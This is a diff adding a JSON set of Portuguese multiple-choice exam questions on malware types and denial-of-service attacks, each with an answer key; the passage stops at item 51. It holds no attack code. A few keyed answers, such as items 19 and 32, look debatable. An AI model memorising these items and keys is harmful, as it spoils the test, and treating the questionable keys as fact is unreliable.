@@ -1,0 +1,1057 @@
+[
+    {
+        "id": 1,
+        "enunciado": "O Engenheiro de Sistemas de uma empresa de logística identifica que os dados vitais da empresa foram criptografados por um atacante, que exige um pagamento em bitcoin para liberar a chave de descriptografia.\nO tipo de malware ou ataque que exige um resgate para restabelecer o acesso aos dados é o",
+        "alternativas": [
+            "Phishing.",
+            "Distributed Denial of Service.",
+            "Spyware.",
+            "Ransomware.",
+            "Trojan Horse."
+        ],
+        "gabarito": "Ransomware."
+    },
+    {
+        "id": 2,
+        "enunciado": "Durante um procedimento de monitoramento de segurança da informação, um analista constata a disseminação acelerada de um código malicioso na rede interna da Assembleia. Esse código explora falhas de segurança em sistemas operacionais e serviços de rede desatualizados, propagando-se de forma autônoma, sem depender de ações do usuário, como o clique em links ou a abertura de anexos.\nConsiderando essas características, assinale a alternativa que indica o tipo de malware capaz de se autorreplicar e se espalhar automaticamente por meio da própria infraestrutura de rede, consumindo recursos dos sistemas afetados.",
+        "alternativas": [
+            "Cavalo de Tróia.",
+            "Vírus de Boot.",
+            "Worm.",
+            "Spyware.",
+            "Adware."
+        ],
+        "gabarito": "Worm."
+    },
+    {
+        "id": 3,
+        "enunciado": "Um ataque atinge a rede da Assembleia, criptografa todos os arquivos críticos de diversos setores, e apresenta uma mensagem de resgate que exige pagamento em criptomoedas para a liberação dos dados mediante o envio de uma chave de decifração.\nA categoria de malware que se encaixa nessa descrição, que bloqueia o acesso a dados ou sistemas exigindo um pagamento para restaurar o acesso, é conhecida como",
+        "alternativas": [
+            "Spyware.",
+            "Keylogger.",
+            "Ransomware.",
+            "Adware.",
+            "Cavalo de Tróia de acesso remoto."
+        ],
+        "gabarito": "Ransomware."
+    },
+    {
+        "id": 4,
+        "enunciado": "Um funcionário da Assembleia nota que seu computador está enviando dados de acesso e capturas de tela para um servidor externo sem o seu conhecimento, enquanto ele utiliza o sistema normalmente. Além disso, ele percebe lentidão ao digitar, sugerindo que suas teclas estão sendo gravadas.\nAssinale a opção que apresenta a combinação de malwares que tem o objetivo principal de monitorar e coletar informações sobre as atividades do usuário e o que é digitado no teclado",
+        "alternativas": [
+            "Adware e Rootkit.",
+            "Spyware e Keylogger.",
+            "Worm e Vírus.",
+            "Ransomware e Backdoor.",
+            "Cavalo de Tróia e Adware."
+        ],
+        "gabarito": "Spyware e Keylogger."
+    },
+    {
+        "id": 5,
+        "enunciado": "Aplicativos de software ou scripts que executam tarefas sob comando de terceiros, permitindo que um invasor assuma remotamente o controle total do computador afetado, em que a máquina comprometida também pode ser chamada de zumbi são rotulados pelo termo:",
+        "alternativas": [
+            "web drive-by.",
+            "backdoor.",
+            "scraper.",
+            "trojan.",
+            "bot."
+        ],
+        "gabarito": "bot."
+    },
+    {
+        "id": 6,
+        "enunciado": "Existem diversas ameaças à segurança operacional das organizações públicas e privadas. A ameaça que se caracteriza por ser um programa que, além da sua função que aparenta desempenhar, conduz propositalmente atividades secundárias imperceptíveis ao usuário e que pode prejudicar a integridade do sistema infectado denomina-se",
+        "alternativas": [
+            "fake news.",
+            "trojan.",
+            "hoax.",
+            "worm.",
+            "phish."
+        ],
+        "gabarito": "trojan."
+    },
+    {
+        "id": 7,
+        "enunciado": "Assinale a opção que apresenta uma definição correta de um tipo de malware.",
+        "alternativas": [
+            "Um spyware se propaga automaticamente pela rede sem interação do usuário.",
+            "Um worm (verme) utiliza a rede para espalhar sua infecção.",
+            "Um cavalo de Troia (trojan) se autorreplica continuamente para esgotar os recursos do sistema.",
+            "Uma backdoor (porta dos fundos) é um malware que se replica e varre a rede automaticamente para infectar outros hosts.",
+            "Um rabbit (coelho) é um malware cujo objetivo principal é capturar credenciais e transmitir dados do usuário."
+        ],
+        "gabarito": "Um worm (verme) utiliza a rede para espalhar sua infecção."
+    },
+    {
+        "id": 8,
+        "enunciado": "O ataque do tipo ransomware, em que o invasor ameaça publicar informações privadas sobre a vítima na Internet, por meio do uso de malwares que capturam telas e outras informações privadas, para humilhá-la e fazê-la pagar um resgate, é denominado",
+        "alternativas": [
+            "mobileware.",
+            "adware.",
+            "doxware.",
+            "hoax."
+        ],
+        "gabarito": "doxware."
+    },
+    {
+        "id": 9,
+        "enunciado": "Relacione os termos da área de segurança para internet às respectivas definições.\n1. MALWARE\n2. RANSOMWARE\n3. SCREENLOGGER\n4. STALKERWARE\n( ) Código que observa os cliques do mouse e registra a posição do cursor e a tela apresentada no monitor, ou a região que circunda determinada posição.\n( ) Código para tornar inacessíveis os dados armazenados no equipamento, geralmente empregando criptografia, e que exige valor de resgate para não divulgar os dados e devolver acesso ao usuário.\n( ) Código que realiza a espionagem do dono do equipamento, sendo executado de forma furtiva, não autorizada e sem a ciência da vítima.\n( ) Código usado como intermediário para envio de spam, realização de ataques e prática de golpes.\nAssinale a opção que indica a relação correta, na ordem apresentada.",
+        "alternativas": [
+            "2 – 1 – 4 – 3.",
+            "3 – 2 – 4 – 1.",
+            "2 – 3 – 1 – 4.",
+            "1 – 4 – 2 – 3.",
+            "4 – 2 – 1 – 3."
+        ],
+        "gabarito": "3 – 2 – 4 – 1."
+    },
+    {
+        "id": 10,
+        "enunciado": "Ana trabalha na empresa Y em home office. Ao retornar do almoço, ela verificou uma mensagem pop-up com o logo de uma empresa de antivírus informando que sua máquina havia sido invadida e que para resolver o problema deveria clicar na verificação de malware solicitada na mensagem. Ana acabou clicando no local solicitado e a mensagem sumiu. Após alguns dias, Ana notou que seus dados pessoais haviam sido roubados e que compras foram feitas em seu nome.\nAna entrou em contato com a empresa Y, informando que tinha sofrido um ataque de:",
+        "alternativas": [
+            "scareware;",
+            "spyware;",
+            "adware;",
+            "malware sem arquivo;",
+            "ransomware."
+        ],
+        "gabarito": "scareware;"
+    },
+    {
+        "id": 11,
+        "enunciado": "Ester estava verificando sua caixa de entrada quando notou um e-mail com o nome de seu chefe, porém com um domínio diferente. Acreditando se tratar de um e- mail pessoal, ela o abriu e baixou um arquivo em anexo. Tal fato possibilitou a um atacante remoto acessar um dispositivo infectado de forma direta e interativa. O computador de Ester começou a apresentar lentidão, o que a levou a fazer varredura com um antivírus.\nO antivírus utilizado identificou o malware como sendo um:",
+        "alternativas": [
+            "remote acess trojan (RAT);",
+            "worm;",
+            "adware;",
+            "spyware;",
+            "backdoor."
+        ],
+        "gabarito": "remote acess trojan (RAT);"
+    },
+    {
+        "id": 12,
+        "enunciado": "Um rootkit tem a capacidade de efetuar diversas modificações em um sistema com o intuito de dissimular sua presença, tornando, assim, mais árdua a tarefa do usuário de detectar sua existência e discernir as alterações realizadas.\nA classificação de um rootkit pode ser determinada com base nas seguintes características:",
+        "alternativas": [
+            "persistente e resiliente;",
+            "modo local e persistente;",
+            "modo local e modo de kernel;",
+            "baseado em máquina virtual e resiliente;",
+            "modo de kernel e baseado em máquina virtual."
+        ],
+        "gabarito": "modo de kernel e baseado em máquina virtual."
+    },
+    {
+        "id": 13,
+        "enunciado": "Um especialista em segurança identificou um ataque que emprega códigos inseridos em um site comprometido para explorar vulnerabilidades em navegadores, visando a atacar um sistema cliente quando o site é visitado.\nÉ correto afirmar que foi(ram) empregado(s):",
+        "alternativas": [
+            "flooders;",
+            "keyloggers;",
+            "downloaders;",
+            "vírus de macro;",
+            "drive-by-download."
+        ],
+        "gabarito": "drive-by-download."
+    },
+    {
+        "id": 14,
+        "enunciado": "Aline estava atualizando os dados de funcionários de sua empresa quando surgiu uma tela pop up no seu notebook informando que seu dispositivo estava infectado.\nA tela dizia que Aline deveria clicar em um botão logo abaixo para instalar um antivírus que faria a limpeza do malware.\nAline clicou no botão e acabou por ser infectada por um:",
+        "alternativas": [
+            "remote acess trojan (RAT);",
+            "scareware;",
+            "stalkerware;",
+            "ransomware;",
+            "backdoor."
+        ],
+        "gabarito": "scareware;"
+    },
+    {
+        "id": 15,
+        "enunciado": "O departamento de TI do TCE-PA está implementando medidas para proteger seus sistemas contra diferentes tipos de malware.\nOs programas maliciosos que se disfarçam como softwares legítimos são denominados",
+        "alternativas": [
+            "virus.",
+            "worms.",
+            "ransomwares.",
+            "adwares.",
+            "trojans."
+        ],
+        "gabarito": "trojans."
+    },
+    {
+        "id": 16,
+        "enunciado": "Relacione as ameaças cibernéticas a seguir com as suas características:\n1. worm\n2. cavalo de Tróia\n3. spyware\n4. ransomware\n( ) Tipo de malware que busca obter informações da máquina alvo sem levantar suspeitas.\n( ) Tipo de malware que infecta máquinas alvo através da rede sem interação dos usuários.\n( ) Tipo de malware que criptografa os dados da máquina alvo.\n( ) Tipo de malware que se passa por um programa legítimo para que o usuário o execute.\nAssinale a opção que indica a relação correta, na ordem apresentada.",
+        "alternativas": [
+            "1 – 2 – 3 – 4.",
+            "2 – 1 – 4 – 3.",
+            "3 – 2 – 1 – 4.",
+            "3 – 1 – 4 – 2.",
+            "1 – 4 – 3 – 2."
+        ],
+        "gabarito": "3 – 1 – 4 – 2."
+    },
+    {
+        "id": 17,
+        "enunciado": "Uma empresa teve as credenciais de acesso a seus sistemas corporativos vazadas. Durante a etapa de investigação desse incidente, identificou-se que um malware foi difundido entre os colaboradores da empresa por meio do anexo de um e-mail. Esse malware monitorava a atividade computacional dos colaboradores, coletava informações sensíveis e as enviava para o atacante na internet.\nAssinale a opção que identifica corretamente o tipo de malware de atacou esta empresa.",
+        "alternativas": [
+            "Adware.",
+            "Virus.",
+            "Ransomware.",
+            "Botnet.",
+            "Spyware."
+        ],
+        "gabarito": "Spyware."
+    },
+    {
+        "id": 18,
+        "enunciado": "Com relação aos códigos maliciosos e malwares, analise as afirmativas a seguir e assinale (V) para a verdadeira e (F) para a falsa.\n( ) Um vírus de macro é um tipo de vírus escrito em linguagem de script, como JavaScript.\n( ) Worm é um tipo de malware que replica a si mesmo de forma automática, sendo capaz de se propagar por uma rede. Geralmente, eles consomem muitos recursos, afetando o desempenho da rede e dos computadores infectados.\n( ) Um keylogger é um tipo de spyware voltado para teclados virtuais que armazena a posição do cursor e a tela quando o mouse é clicado. Dessa forma, ele pode capturar teclas selecionadas em teclados virtuais.\nAs afirmativas são, respectivamente,",
+        "alternativas": [
+            "V – V – F.",
+            "V – F – F.",
+            "F – V – V.",
+            "F – V – F.",
+            "V – F – V."
+        ],
+        "gabarito": "F – V – F."
+    },
+    {
+        "id": 19,
+        "enunciado": "Alguns computadores de uma rede segmentada de um órgão foram infectados por códigos maliciosos inseridos por um invasor que se utilizou das vulnerabilidades existentes no seu sistema operacional. Os códigos maliciosos não se propagam, mas permitem o retorno do invasor sempre que desejar e permitem a instalação de outros códigos maliciosos.\nO tipo de código malicioso que infectou os referidos computadores é um:",
+        "alternativas": [
+            "BOT;",
+            "spyware;",
+            "backdoor;",
+            "rootkit;",
+            "vírus."
+        ],
+        "gabarito": "rootkit;"
+    },
+    {
+        "id": 20,
+        "enunciado": "Uma estação de trabalho (ET) de um desenvolvedor foi infectada por um trojan (Cavalo de Troia) que instala códigos maliciosos que estão embutidos em seu próprio código.\nA ET do desenvolvedor foi infectada por um trojan do tipo:",
+        "alternativas": [
+            "downloader;",
+            "dropper;",
+            "backdoor;",
+            "destrutivo;",
+            "spy."
+        ],
+        "gabarito": "dropper;"
+    },
+    {
+        "id": 21,
+        "enunciado": "O ethical hacker contratado pelo órgão identificou um malware instalado em alguns computadores do órgão. Ele analisou o comportamento desse malware e identificou as seguintes características:\n1. foi recebido por email;\n2. foi instalado após sua execução explícita;\n3. sua propagação ocorreu por meio de envio de uma cópia de si próprio automaticamente por email;\n4. não furta informações sensíveis; e\n5. não envia SPAM e phishing.\nO malware identificado é do tipo:",
+        "alternativas": [
+            "rootkit;",
+            "backdoor;",
+            "worm;",
+            "trojan;",
+            "vírus."
+        ],
+        "gabarito": "worm;"
+    },
+    {
+        "id": 22,
+        "enunciado": "Em uma empresa de TI, a equipe de segurança da informação está conduzindo uma investigação sobre uma série de incidentes que afetaram sua rede nos últimos meses. Eles descobriram que um tipo particular de malware tem sido especialmente desafiador de detectar e mitigar. Durante a análise, a equipe descobriu que o vírus muda a cada infecção e reescreve a si mesmo completamente a cada iteração, o que aumenta a dificuldade de detecção.\nEsse vírus, que também é capaz de mudar seu comportamento e sua aparência, é classificado, de acordo com sua estratégia de ocultação, como:",
+        "alternativas": [
+            "cifrado;",
+            "camuflado;",
+            "polimórfico;",
+            "metamórfico;",
+            "infectante de arquivo ou de boot."
+        ],
+        "gabarito": "metamórfico;"
+    },
+    {
+        "id": 23,
+        "enunciado": "Gilberto, um investidor da bolsa de valores, recebeu um email, supostamente enviado pela Bolsa de Valores de São Paulo (Bovespa), solicitando que verificasse sua conta na corretora, pois poderia ter sido alvo de ransonware. Gilberto abriu o e-mail, leu seu conteúdo e depois seguiu as instruções apresentadas, acessando sua conta.\nO que Gilberto não sabia é que no e-mail havia um código malicioso que passou a monitorar as atividades executadas e enviar as informações coletadas para terceiros.\nApós ter perdido seus ativos, Gilberto descobriu que foi alvo de um:",
+        "alternativas": [
+            "trojan;",
+            "stalkerware;",
+            "backdoor;",
+            "remote acess trojan;",
+            "bot."
+        ],
+        "gabarito": "stalkerware;"
+    },
+    {
+        "id": 24,
+        "enunciado": "Nos últimos anos vimos um significativo aumento no número de ameaças virtuais; entre elas, destaca-se o ransomware. O ransomware é um software de extorsão que pode bloquear o seu computador e depois exigir um resgate para desbloqueá-lo. Dependendo do tipo de ransomware, todo o sistema operacional (ou apenas arquivos individuais) é criptografado e, em seguida um resgate é exigido das vítimas, o que causa, além de prejuízos financeiros, danos à reputação da marca e problemas com a Autoridade Nacional de Proteção de Dados (ANPD).\nA principal forma de proteção e restauração dos dados é",
+        "alternativas": [
+            "ter uma política de segurança para evitar a ameaça.",
+            "implementar um firewall de última geração.",
+            "realizar testes de engenharia social com os funcionários.",
+            "ter uma rotina de backup adequada e validada.",
+            "implementar monitoramento de fluxo da rede de computadores."
+        ],
+        "gabarito": "ter uma rotina de backup adequada e validada."
+    },
+    {
+        "id": 25,
+        "enunciado": "As ferramentas de intrusão apresentam uma gama diversificada de semelhanças e algumas diferenças.\nRelacione os tipos de ataque em redes de computadores, listados a seguir, às descrições de suas características e sintomas.\n1. Vírus\n2. Trojan\n3. Worm\n4. Software Bomb\n( ) Ação direta, autorreplicação e destruição da informação.\n( ) Ação indireta, abertura de portas e perda de controle do computador hospedeiro.\n( ) Ação direta, propagação através de uma rede de computadores e mensagens parasíticas.\n( ) Ação direta, início após um determinado evento e nenhum sintoma prévio até a inicialização.\nAssinale a opção que indica a relação correta, segundo a ordem apresentada.",
+        "alternativas": [
+            "1 – 2 – 3 – 4.",
+            "1 – 3 – 4 – 2.",
+            "2 – 3 – 1 – 4.",
+            "4 – 2 – 1 – 3.",
+            "4 – 3 – 2 – 1."
+        ],
+        "gabarito": "1 – 2 – 3 – 4."
+    },
+    {
+        "id": 26,
+        "enunciado": "Alexandre chegou ao trabalho e foi impedido de acessar sua estação de trabalho pela equipe de crise. Conversando com os membros da equipe, foi informado de que os arquivos foram criptografados, e que o sequestrador exigiu um pagamento em bitcoins para que ocorresse a decriptografia.\nNesse contexto, Alexandre logo percebeu que foi um ataque por meio de:",
+        "alternativas": [
+            "Backdoor;",
+            "Negação de serviço;",
+            "Keylogger;",
+            "Ransomware;",
+            "Injeção de código."
+        ],
+        "gabarito": "Ransomware;"
+    },
+    {
+        "id": 27,
+        "enunciado": "A rede interna da DPE/RS sofreu o ataque de um malware. Ao fazer a análise do ataque, Luís, analista de segurança da informação, verificou que o malware replicava a si mesmo automaticamente com o objetivo de infectar os outros computadores da rede.\nO malware que originou esse ataque é um:",
+        "alternativas": [
+            "Vírus;",
+            "Worm;",
+            "Spyware;",
+            "Ransomware;",
+            "Keylogger."
+        ],
+        "gabarito": "Worm;"
+    },
+    {
+        "id": 28,
+        "enunciado": "O computador de Elias foi infectado por um rootkit que não foi mais detectado no computador assim que ele foi reiniciado. É correto afirmar que o computador havia sido infectado por um rootkit de:",
+        "alternativas": [
+            "memória;",
+            "kernel;",
+            "aplicativos;",
+            "carregador de boot;",
+            "firmware."
+        ],
+        "gabarito": "memória;"
+    },
+    {
+        "id": 29,
+        "enunciado": "Marcos, advogado que sempre acessava os sistemas de um Tribunal de Justiça para fazer consultas de processos, usou seus conhecimentos de informática para invadir tais sistemas. Tendo acesso ao nível raiz e aos demais níveis, utilizou um conjunto de ferramentas de hacker para fazer alterações indevidas. Baseado nas informações acima, é correto afirmar que Marcos utilizou:",
+        "alternativas": [
+            "vírus;",
+            "rootkit;",
+            "spyware;",
+            "keyloggers;",
+            "bomba lógica."
+        ],
+        "gabarito": "rootkit;"
+    },
+    {
+        "id": 30,
+        "enunciado": "Um analista de TI identificou um tipo de malware e está analisando seus componentes. A condição que determina quando a carga útil de um malware é ativada ou entregue denomina-se:",
+        "alternativas": [
+            "função lógica;",
+            "bomba lógica;",
+            "vetor de infecção;",
+            "fase de propagação;",
+            "mecanismo de infecção."
+        ],
+        "gabarito": "bomba lógica;"
+    },
+    {
+        "id": 31,
+        "enunciado": "O software malicioso pode ser dividido em duas categorias: aqueles que precisam de um programa hospedeiro e aqueles que são independentes. Além disso, também podem diferenciar-se entre aquelas ameaças de softwares que não se replicam e aquelas que se replicam. Dentre algumas das principais categorias de softwares maliciosos, é correto afirmar que:",
+        "alternativas": [
+            "os rootkits são programas que instalam outros itens em uma máquina sob ataque. São códigos específicos para uma única vulnerabilidade ou conjuntos de vulnerabilidades;",
+            "os autorooters são ferramentas maliciosas de hacker usadas para invasão de novas máquinas remotamente;",
+            "um kit (gerador de vírus) é usado para atacar sistemas de computador em rede com um grande volume de tráfego para executar um ataque de negação de serviço (DoS);",
+            "os vírus são programas que propagam cópias de si mesmos a outros computadores;",
+            "os vermes são programas que contêm funcionalidades adicionais inesperadas."
+        ],
+        "gabarito": "os autorooters são ferramentas maliciosas de hacker usadas para invasão de novas máquinas remotamente;"
+    },
+    {
+        "id": 32,
+        "enunciado": "Carlos recebeu um e-mail que parecia pertencer ao seu banco e, sem perceber, baixou e instalou um software malicioso no seu computador. A partir desse software, um criminoso cibernético passou a ter o controle do computador de Carlos.\nO software malicioso instalado no computador de Carlos é:",
+        "alternativas": [
+            "phishing;",
+            "DoS;",
+            "ransomware;",
+            "rootkit;",
+            "sandbox."
+        ],
+        "gabarito": "rootkit;"
+    },
+    {
+        "id": 33,
+        "enunciado": "João administra uma rede de computadores com muitos sistemas de informação cujas operações são de acesso restrito, pois contém informações confidenciais. Nos últimos meses, João recebeu diversos relatos de ataques de keylogger e screenlog.\nDiante desse cenário, João deve proteger a sua rede de ataques do tipo:",
+        "alternativas": [
+            "worm;",
+            "spyware;",
+            "botnet;",
+            "zumbi;",
+            "remote access trojan."
+        ],
+        "gabarito": "spyware;"
+    },
+    {
+        "id": 34,
+        "enunciado": "Após um sistema Linux apresentar um comportamento estranho, uma análise mais detalhada verificou que estava infectado por um malware. A detecção foi difícil, pois o malware evitava sua detecção, escondendo processos e arquivos do sistema, não importando qual ferramenta fosse usada para listar esses processos e arquivos.\nEsse malware provavelmente é um",
+        "alternativas": [
+            "backdoor.",
+            "cavalo de Tróia.",
+            "bot.",
+            "rootkit de kernel.",
+            "ransomware."
+        ],
+        "gabarito": "rootkit de kernel."
+    },
+    {
+        "id": 35,
+        "enunciado": "O software malicioso que toma como refém informações pessoais ou corporativas e que depende do pagamento de uma quantia em dinheiro ou bitcoins para a liberação desses se denomina",
+        "alternativas": [
+            "swindling.",
+            "rootkit.",
+            "adware.",
+            "ransomware.",
+            "scareware."
+        ],
+        "gabarito": "ransomware."
+    },
+    {
+        "id": 36,
+        "enunciado": "As ameaças virtuais representam riscos a qualquer computador conectado à internet. Os softwares que realizam ações maliciosas, publicidade indevida, coleta de informações pessoais ou alteração da configuração do computador, sem o consentimento do usuário são denominados",
+        "alternativas": [
+            "Trojan.",
+            "Spywares.",
+            "Ransonware.",
+            "Worm.",
+            "DDoS."
+        ],
+        "gabarito": "Spywares."
+    },
+    {
+        "id": 37,
+        "enunciado": "O site oficial da Assembleia Legislativa sofre um ataque onde múltiplos acessos simultâneos e coordenados, provenientes de milhares de máquinas comprometidas espalhadas pelo mundo, inundam os servidores, esgotando sua capacidade de processamento e banda, tornando o serviço indisponível para o público.\nEsse cenário de sobrecarga maciça de um alvo, caracterizado por utilizar uma grande quantidade de fontes controladas remotamente, descreve o seguinte tipo de ataque:",
+        "alternativas": [
+            "Man-in-the-Middle (MITM).",
+            "Denial of Service Distribuído (DDoS).",
+            "Phishing.",
+            "Spoofing de IP.",
+            "Cross-Site Request Forgery (CSRF)."
+        ],
+        "gabarito": "Denial of Service Distribuído (DDoS)."
+    },
+    {
+        "id": 38,
+        "enunciado": "Um agente malicioso provoca a sobrecarga de um servidor de aplicações da Assembleia. Para isso, envia continuamente um grande volume de pacotes SYN, utilizando endereços IP de origem forjados. O objetivo é esgotar os recursos responsáveis pelo gerenciamento de conexões e impedir o estabelecimento de sessões legítimas.\nDiante desse cenário, assinale a alternativa que classifica o tipo de ataque caracterizado pelo esgotamento da tabela de estados de conexão de um servidor ou dispositivo de rede, por meio do envio de requisições parciais ou inválidas.",
+        "alternativas": [
+            "Spoofing de ARP.",
+            "Cross-Site Scripting (XSS).",
+            "Flood.",
+            "Man-in-the-Browser.",
+            "Zero-Day."
+        ],
+        "gabarito": "Flood."
+    },
+    {
+        "id": 39,
+        "enunciado": "Os ataques de negação de serviço distribuída (DDoS) configuram-se como uma ameaça relevante à disponibilidade de sistemas e serviços na Internet, tornando sua prevenção e mitigação aspectos essenciais da administração de redes computacionais Nesse contexto, é correto afirmar que o ataque",
+        "alternativas": [
+            "Ping of Death (PoD) envia uma solicitação de conexão enviando um flag SYN e não concluindo o three-hand shaking, deixando conexões semiabertas até esgotamento da fila.",
+            "Slowloris envia mensagens ICMP com um endereço falsificado da vítima em broadcast, recebendo uma avalanche de respostas dos receptores.",
+            "Smurf atua na camada de aplicação enviando massivas requisições HTTP GET e POST, com o objetivo de esgotar os recursos do servidor web.",
+            "Teardrop, no protocolo IPv4, originalmente explora falhas na remontagem de pacotes IP, enviando fragmentos com campos de deslocamento inconsistentes que se sobrepõem e provocam travamento do host de destino.",
+            "UDP storm envia fragmentos IP grandes e malformados à vítima usando o comando ping, causando estouro na remontagem de fragmentos IP."
+        ],
+        "gabarito": "Teardrop, no protocolo IPv4, originalmente explora falhas na remontagem de pacotes IP, enviando fragmentos com campos de deslocamento inconsistentes que se sobrepõem e provocam travamento do host de destino."
+    },
+    {
+        "id": 40,
+        "enunciado": "Serviços mal configurados podem ser utilizados em ataques distribuídos de negação de serviços (DDoS) por amplificação.\nAvalie se, nesse caso, as seguintes ações podem ser implementadas contra ataques de amplificação.\nI. Correção das configurações de Servidores DNS recursivos abertos, pois eles aceitam consultas recursivas de modo indiscriminado, de qualquer rede da Internet, na porta 53, utilizando protocolo UTP.\nII. Correção das configurações de Serviço NetBIOS (137/UDP) desabilitando o recurso chamado NetBIOS sobre TCP/IP (ou NetBIOS over TCP/IP) se ele for desnecessário aos usuários da rede, ou se for imprescindível que se estabeleça limite de acesso a esse serviço apenas para usuários da rede.\nIII. Correção das configurações de Serviço SSDP (Simple Service Discovery Protocol), pois o atacante pode enviar uma requisição forjando o MAC ADRESS da vítima e o servidor com SSDP/UPnP retorna uma resposta exagerada.\nEstá correto o que se afirma em",
+        "alternativas": [
+            "I, apenas.",
+            "II, apenas.",
+            "III, apenas.",
+            "I e II.",
+            "II e III."
+        ],
+        "gabarito": "II, apenas."
+    },
+    {
+        "id": 41,
+        "enunciado": "As redes sem fio em ambiente corporativo possuem diversas vantagens quando comparadas com a rede cabeada. Por outro lado, o uso de access point torna a rede mais vulnerável a ataques cibernéticos, como, por exemplo, a negação de serviço (DoS).\nO ataque do tipo DoS consiste em:",
+        "alternativas": [
+            "andar pela cidade procurando redes sem fio vulneráveis;",
+            "escutar o tráfego de dados que está passando por um ponto de acesso;",
+            "descobrir as credenciais de acesso à rede sem fio a partir da força bruta;",
+            "instalar um ponto de acesso falso na rede, de tal forma que o usuário se conecte indevidamente a ele;",
+            "emitir um sinal interferente na frequência de operação e próximo ao access point com o objetivo de deixar o dispositivo inoperante."
+        ],
+        "gabarito": "emitir um sinal interferente na frequência de operação e próximo ao access point com o objetivo de deixar o dispositivo inoperante."
+    },
+    {
+        "id": 42,
+        "enunciado": "Ana foi contratada pela empresa K para identificar pontos de vulnerabilidades na rede local. Ela identificou uma brecha de segurança que visava a comprometer os dados transmitidos a um dispositivo conectado a um switch de rede com o objetivo de estourar a tabela de endereços MAC para os dispositivos e seus segmentos de rede correspondentes.\nO possível ataque que usaria a brecha de segurança identificada por Ana é o:",
+        "alternativas": [
+            "phishing;",
+            "spoofing;",
+            "DoS;",
+            "DDoS;",
+            "flood."
+        ],
+        "gabarito": "flood."
+    },
+    {
+        "id": 43,
+        "enunciado": "Servidores que fornecem serviço na internet estão sujeitos a ataques de negação de serviço (DoS), os quais tentam impedir respostas aos clientes por meio da sobrecarga de recursos do servidor. Entretanto, existem determinadas configurações do Servidor Apache HTTP que podem ajudar a mitigar esse tipo de problema. Sobre esse contexto, assinale a afirmativa correta.",
+        "alternativas": [
+            "A diretiva TimeOut deve ser aumentada em sites sujeitos a ataques DoS.",
+            "Utilizar a diretiva LoadShare para distribuir parte do processamento da requisição para sistemas operacionais que permitam essa operação. Tal recurso não está ativo por padrão no Apache httpd, mas pode exigir a reconfiguração do seu kernel.",
+            "A diretiva MaxRequestWorkers pode ser reduzida em sites sujeitos a ataques DoS. Alguns sites até desativam completamente os workers por meio da diretiva KeepAlive, o que não gera problemas de desempenho.",
+            "A diretiva RequestReadTimeout permite implementar ajustes com o objetivo de que o servidor lide com o número máximo de conexões simultâneas sem ficar sem recursos.",
+            "O emprego de threads via Multi-Processing Modules (MPMs) permite trabalhar com mais conexões simultâneas, mitigando assim ataques do tipo DoS."
+        ],
+        "gabarito": "O emprego de threads via Multi-Processing Modules (MPMs) permite trabalhar com mais conexões simultâneas, mitigando assim ataques do tipo DoS."
+    },
+    {
+        "id": 44,
+        "enunciado": "Um cibercriminoso toma o controle de vários servidores pela Internet, instruindo-os a enviar requisições para um servidor web alvo de modo a exaurir seus recursos computacionais até que esse servidor web não possa fornecer seus serviços.\nEsse servidor web foi alvo de um ataque",
+        "alternativas": [
+            "adware.",
+            "cavalo de Tróia.",
+            "ddos.",
+            "keylogger.",
+            "worm."
+        ],
+        "gabarito": "ddos."
+    },
+    {
+        "id": 45,
+        "enunciado": "O servidor web corporativo do órgão ABC sofreu um ataque DDOS (Distributed Denial of Service), no qual o atacante realizou consultas DNS oriundas de diversos computadores. Os pacotes enviados pelos computadores atacantes tiveram seus endereços IP de origem alterados, por meio da técnica de IP Spoofing, para o endereço IP do servidor web do órgão. As solicitações para o servidor DNS foram realizadas com argumentos “ANY”, resultando em respostas bem grandes, congestionando a rede e levando o servidor Web a negar seus serviços.\nO servidor web sofreu um ataque DDOS do tipo:",
+        "alternativas": [
+            "flood TCP SYN;",
+            "amplificação de DNS;",
+            "inundação de DNS;",
+            "HTTP flood;",
+            "fragmentação de IP."
+        ],
+        "gabarito": "amplificação de DNS;"
+    },
+    {
+        "id": 46,
+        "enunciado": "Marcos trabalha no setor de segurança de redes da empresa X Ltda. e, ao observar o arquivo de log do roteador, notou uma grande quantidade de acessos indesejados, provenientes de diferentes servidores, em curto espaço de tempo. Durante o período em que ocorreram os acessos, diversas reclamações acerca do tempo de resposta foram recebidas pela equipe de suporte.\nMarcos concluiu, corretamente, que ocorreu um ataque do tipo:",
+        "alternativas": [
+            "Phishing;",
+            "Ransomware;",
+            "DDoS;",
+            "Backdoor;",
+            "Keylogger."
+        ],
+        "gabarito": "DDoS;"
+    },
+    {
+        "id": 47,
+        "enunciado": "Um ataque de negação de serviço distribuído (DDoS) é um ataque cibernético do tipo",
+        "alternativas": [
+            "backdoor.",
+            "flood.",
+            "phishing.",
+            "spoofing.",
+            "spyware."
+        ],
+        "gabarito": "flood."
+    },
+    {
+        "id": 48,
+        "enunciado": "Uma grande emissora de televisão sofreu um ataque de DDoS e, após análise minuciosa, foi identificada a exploração de uma técnica comumente utilizada por servidores, que é usar vários threads para dar suporte a várias requisições à mesma aplicação de servidor. A técnica utilizada foi:",
+        "alternativas": [
+            "slowloris;",
+            "inundação SIP;",
+            "ataques de difusão;",
+            "ataques de amplificação;",
+            "ataques refletores e amplificadores."
+        ],
+        "gabarito": "slowloris;"
+    },
+    {
+        "id": 49,
+        "enunciado": "Sobre a natureza dos ataques do tipo DoS e DDoS em redes de computadores, assinale a afirmativa correta.",
+        "alternativas": [
+            "Enviam numerosos e-mails com links falsos, direcionados para programas e downloads maliciosos.",
+            "Interceptam a comunicação em locais públicos em busca de informações sobre logins/senhas, dentre outras.",
+            "Tentam assumir remotamente o controle de outros computadores por meio de vulnerabilidades no Firewall.",
+            "Tentam sobrecarregar um ou mais servidores de modo a impedir o funcionamento normal dos serviços.",
+            "Usam “força bruta” para descobrir, por tentativa e erro, logins/senhas para invadir contas e acessar dados sensíveis."
+        ],
+        "gabarito": "Tentam sobrecarregar um ou mais servidores de modo a impedir o funcionamento normal dos serviços."
+    },
+    {
+        "id": 50,
+        "enunciado": "Um cibercriminoso tentou obstruir o acesso ao portal institucional de uma empresa sobrecarregando os servidores web com muitas requisições HTTP simultâneas, de forma a deixar os servidores e site lento e indisponível para acesso.\nEsse tipo de ataque cibernético que inunda servidores da Web com solicitações que impedem a conexão de seus usuários regulares é denominado",
+        "alternativas": [
+            "Decoy.",
+            "DMA.",
+            "DoS.",
+            "Trojan.",
+            "Ransomware."
+        ],
+        "gabarito": "DoS."
+    },
+    {
+        "id": 51,
